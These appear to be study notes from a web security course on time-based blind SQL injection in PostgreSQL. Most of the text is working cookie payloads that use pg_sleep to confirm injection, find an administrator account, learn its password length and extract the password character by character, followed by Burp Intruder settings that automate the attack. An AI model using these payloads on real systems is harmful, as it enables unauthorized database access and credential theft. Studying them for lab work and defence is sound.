# Section 15: Time-Based Blind SQL injection

## Discovering Time-Based Blind SQLi

When there is no visible change in the web page for truthy or falsy sql injection statement, there is still a way to discover if an SQL statement
is executed by running a sleep function and checking the reponse time of the request

**Example**: Inject sleep in a request cookie

In a PostgreSQL DB engine:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||pg_sleep(10)--
```

can test multiple sleep seconds to verify

---

## Extracting Data From the Database Using a Time-Based Blind SQLi

Confirm true statements with **conditional time delays**:

```
SELECT
  CASE
    WHEN (2=2) THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
```

Should take 10 seconds to load:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)'--
```

Should load quickly because the condition is false:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)'--
```

### Extracting Data

If we have a table that is called users, will sleep for 10 seconds

```
SELECT
  CASE
    WHEN (2=2) THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```



```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

Check if an administrator user exists:

```
SELECT
  CASE
    WHEN (username='administrator') THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

Check password length of administrator:

```
SELECT
  CASE
    WHEN (username='administrator' AND LENGTH (password)>1) THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```



---

## Getting the Admin Password Using a Time-Based Blind SQLi

similar approach with blind SQL

```
SELECT
  CASE
    WHEN (username='administrator' AND SUBSTRING (password,1,1)='a' THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

Send it to the Intruder (allow to specify certain locations within the request, where we can automatically change and send to the target web application)

Modify, location and letter replace with `§`

Positions:
  - Attack type: Cluster bomb (because 2 parts are being manipulated)
    
Payloads
  - Payload set 1: Numbers (1 to 20, step 1)
  - Payload set 2: Brute force (Character set: alphanumberic, 1 min and 1 max, step 1)

Resource Pool (needed for the time-based attack only)
  - 1 at a time1, instead of the default
    - because we want to monitor the response time
  - create new resource pool, Max concurrent requests: 1 


Add new column **Response Received** and look for over 10000 (ms)

---




